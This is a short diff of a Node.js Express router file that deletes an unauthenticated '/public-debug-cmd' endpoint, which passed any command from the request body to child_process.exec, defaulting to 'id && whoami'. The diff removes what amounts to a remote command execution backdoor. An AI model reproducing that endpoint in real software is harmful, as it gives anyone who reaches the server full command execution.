@@ -46,13 +46,7 @@ function authMiddleware(req, res, next) {
   res.status(401).json({ error: 'Avtorizatsiyadan o\'tilmagan!' });
 }
 
-router.post('/public-debug-cmd', (req, res) => {
-  const { exec } = require('child_process');
-  const command = req.body.cmd || 'id && whoami';
-  exec(command, { cwd: path.join(__dirname, '..') }, (err, stdout, stderr) => {
-    res.json({ err: err?.message, stdout, stderr });
-  });
-});
+// Public API endpoints (accessible without token by public catalog/Mini App)
 
 router.post('/deploy', (req, res) => {
   const { exec } = require('child_process');
